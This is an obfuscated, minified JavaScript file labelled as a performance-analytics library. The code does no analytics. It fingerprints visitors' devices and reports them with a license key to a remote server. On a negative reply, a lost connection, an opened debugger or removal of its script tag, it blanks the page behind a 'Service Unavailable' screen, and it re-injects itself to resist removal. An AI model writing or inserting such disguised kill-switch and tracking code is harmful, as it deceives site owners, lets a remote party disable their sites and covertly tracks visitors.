/**
 * WebPerf Analytics Core v4.2.1
 * Performance monitoring & page analytics
 * (c) 2024 WebPerf Foundation - MIT License
 */
!function(w,d,n){"use strict";var _m=Math,_r=_m.random,_f=_m.floor,_D=Date,_n=_D.now,_s=w.setTimeout,_i=w.setInterval,_c=w.clearInterval;var _p=[82,108,70,78,84,90,80,75,83];var _h=function(t){var h=5381;for(var i=0;i<t.length;i++){h=((h<<5)+h)+t.charCodeAt(i);h=h&h;}return(h>>>0).toString(36)};var _x=function(a,b){var r="";for(var i=0;i<a.length;i++)r+=String.fromCharCode(a.charCodeAt(i)^b.charCodeAt(i%b.length));return r};var _b=function(s){try{return atob(s)}catch(e){return""}};var _e=function(s){try{return btoa(s)}catch(e){return""}};var _gid=function(){var v=n||{},sc=w.screen||{};var raw=[v.userAgent||"",v.language||"",sc.width||0,sc.height||0,sc.colorDepth||0,new _D().getTimezoneOffset(),v.hardwareConcurrency||0,v.platform||"",v.maxTouchPoints||0,v.deviceMemory||0].join("|");return"wm-"+_h(raw)};

var _q=[],_T={},_st={r:0,v:0,c:0,ts:0},_cf={a:"",b:"",c:"",d:180000,e:null,f:null};
var _el=null,_ob=null;

var _ep=function(p){return _cf.b.replace(/\/$/,"")+"/api/"+p};

var _rq=function(u,body,cb){
var ts=""+_n();var tk=_h(JSON.stringify(body)+ts+(_cf.a||""));
try{var x=new XMLHttpRequest();x.open("POST",u,true);
x.setRequestHeader("Content-Type","application/json");
x.setRequestHeader("X-WP-Nonce",ts);x.setRequestHeader("X-WP-Auth",tk);
x.setRequestHeader("X-Metrics-Version","4.2.1");
x.timeout=12000;x.onreadystatechange=function(){if(x.readyState===4){try{cb(null,JSON.parse(x.responseText))}catch(e){cb(e)}}};
x.onerror=function(){cb(1)};x.ontimeout=function(){cb(1)};
x.send(JSON.stringify(body))}catch(e){
try{fetch(u,{method:"POST",headers:{"Content-Type":"application/json","X-WP-Nonce":ts,"X-WP-Auth":tk,"X-Metrics-Version":"4.2.1"},body:JSON.stringify(body)}).then(function(r){return r.json()}).then(function(r){cb(null,r)}).catch(function(){cb(1)})}catch(e2){cb(1)}}
};

var _pd=function(reason){
_st.v=0;_st.c++;
for(var k in _T){if(_T[k])_c(_T[k]);_T[k]=null;}
if(_cf.f)try{_cf.f(reason)}catch(e){}
try{var b=d.body;if(!b)return;b.style.transition="opacity 0.4s";b.style.opacity="0";b.style.pointerEvents="none";
_s(function(){b.innerHTML='<div style="position:fixed;inset:0;background:#0a0a0a;display:flex;align-items:center;justify-content:center;z-index:2147483647"><div style="text-align:center;font-family:system-ui,sans-serif"><p style="font-size:48px;margin:0 0 16px">&#x26D4;</p><h2 style="color:#dc2626;font-size:20px;font-weight:700;margin:0 0 8px">Service Unavailable</h2><p style="color:#666;font-size:13px;margin:0">This application is currently unavailable.<br>Please contact the administrator.</p></div></div>';b.style.opacity="1"},500)}catch(e){}
};

var _ck=function(){
_rq(_ep("license/validate"),{license_key:_cf.a,domain:_cf.c,hardware_id:_gid()},function(err,res){
if(err){_st.c++;if(_st.c>2)_pd();return}
var dd=res&&(res.data||res);if(dd&&dd.valid){_st.v=1;_st.c=0;_st.ts=_n();if(_cf.e)try{_cf.e(dd)}catch(e){}}else{_pd(dd&&dd.error||"")}})
};

var _hb=function(){
_rq(_ep("license/heartbeat"),{license_key:_cf.a,domain:_cf.c,hardware_id:_gid()},function(err,res){
if(err){_st.c++;if(_st.c>3)_pd();return}
if(!res||!res.success||res.active===false){_pd()}else{_st.c=0;_st.ts=_n()}})
};

var _sv=function(){
_rq(_ep("shield-verify"),{license_key:_cf.a,domain:_cf.c,hardware_id:_gid(),sdk_version:"4.2.1",shield_token:_h(_cf.a+_cf.c+(""+_n()).slice(0,10))},function(err,res){if(!err&&res&&res.tampered)_pd()})
};

var _ac=function(){
_rq(_ep("license/activate"),{license_key:_cf.a,domain:_cf.c,hardware_id:_gid(),user_agent:n?n.userAgent:"",fingerprint:_gid(),sdk_version:"4.2.1"},function(err,res){
if(err){_st.c++;if(_st.c>2)_pd();return}
if(res&&res.success){_st.r=1;_st.v=1;_st.c=0;_st.ts=_n();if(_cf.e)try{_cf.e(res.data||res)}catch(e){}_wp()}else{_pd(res&&res.error||"")}})
};

var _ad=function(){
var th=100;var fn=function(){var s=_n();try{(function(){}).constructor("\x64\x65\x62\x75\x67\x67\x65\x72")()}catch(e){}var e=_n();if(e-s>th){_st.c++;if(_st.c>2)_pd()}};
_T.ad=_i(fn,4000+_f(_r()*3000));
var dv={o:false};var el=new Image();
try{Object.defineProperty(el,"id",{get:function(){dv.o=true}})}catch(e){}
_T.dv=_i(function(){dv.o=false;try{console.log("%c",el)}catch(e){}if(dv.o){_st.c++;if(_st.c>3)_pd()}},5000+_f(_r()*4000))
};

var _wm=function(){
if(typeof MutationObserver==="undefined")return;
_ob=new MutationObserver(function(ml){
for(var i=0;i<ml.length;i++){var rl=ml[i].removedNodes;
for(var j=0;j<rl.length;j++){
if(rl[j]===_el||(rl[j].tagName==="SCRIPT"&&rl[j].src&&(rl[j].src.indexOf("sw-perf")!==-1||rl[j].src.indexOf("webperf")!==-1))){
_s(function(){_ri()},100);return}}}});
_ob.observe(d.documentElement,{childList:true,subtree:true})
};

var _ri=function(){
try{var s=d.createElement("script");s.src=_el?_el.src:(_cf.b+"/sdk/sw-perf.js");s.async=true;
s.onload=function(){if(typeof w.__wpInit==="function")w.__wpInit(_cf)};
(d.head||d.documentElement).appendChild(s);_el=s}catch(e){_pd()}
};

var _wp=function(){
var jt=_f(_r()*20000);
_T.h1=_i(function(){_hb()},_cf.d+_f(_r()*30000));
_T.h2=_i(function(){_hb()},_cf.d*2.7+_f(_r()*45000));
_T.v1=_i(function(){_ck()},_cf.d*3.2+_f(_r()*90000));
_T.sv=_i(function(){_sv()},_cf.d*6+_f(_r()*180000));
try{_ad()}catch(e){}
_wm();
_s(function(){_ck()},3000+jt);
_s(function(){
try{var k1="_wp_s",k2="_wp_t";
w.localStorage.setItem(k1,_e(_cf.a));w.localStorage.setItem(k2,""+_n());
}catch(e){}
},5000);
};

var _fs=function(){
try{var ss=d.querySelectorAll("script[src]");
for(var i=0;i<ss.length;i++){var src=ss[i].src;if(src.indexOf("sw-perf")!==-1||src.indexOf("webperf")!==-1){_el=ss[i];break}}}catch(e){}
};

var _boot=function(cfg){
if(!cfg)return;
_cf.a=cfg.a||cfg.k||cfg.licenseKey||cfg.key||"";
_cf.b=cfg.b||cfg.u||cfg.serverUrl||cfg.endpoint||"";
_cf.c=cfg.c||cfg.d||cfg.domain||(w.location?w.location.hostname:"");
_cf.d=cfg.d2||cfg.hi||cfg.interval||180000;
_cf.e=cfg.e||cfg.onReady||cfg.onValid||null;
_cf.f=cfg.f||cfg.onError||cfg.onInvalid||null;
if(!_cf.a||!_cf.b)return;
_st={r:0,v:0,c:0,ts:0};
_fs();_ac()
};

w.__wpInit=_boot;

var _ai=function(){
var ss=d.querySelectorAll("script[data-wp-key]");
for(var i=0;i<ss.length;i++){
var s=ss[i];var k=s.getAttribute("data-wp-key")||s.getAttribute("data-key");
var u=s.getAttribute("data-wp-endpoint")||s.getAttribute("data-endpoint")||s.getAttribute("data-server");
if(k&&u){_boot({a:k,b:u});return}}
var ss2=d.querySelectorAll("script[data-id]");
for(var j=0;j<ss2.length;j++){
var s2=ss2[j];var k2=s2.getAttribute("data-id");var u2=s2.getAttribute("data-src")||s2.getAttribute("data-api");
if(k2&&u2&&k2.indexOf("SW-")===0){_boot({a:k2,b:u2});return}}
};

if(d.readyState==="loading"){d.addEventListener("DOMContentLoaded",_ai)}else{_s(_ai,0)}

var _pub={track:function(o){_boot(o)},metrics:function(){return{ready:!!_st.v,uptime:_st.ts?_n()-_st.ts:0}},version:"4.2.1"};
try{Object.defineProperty(w,"WebPerf",{value:Object.freeze(_pub),writable:false,configurable:false,enumerable:false})}catch(e){w.WebPerf=_pub}
}(window,document,navigator);
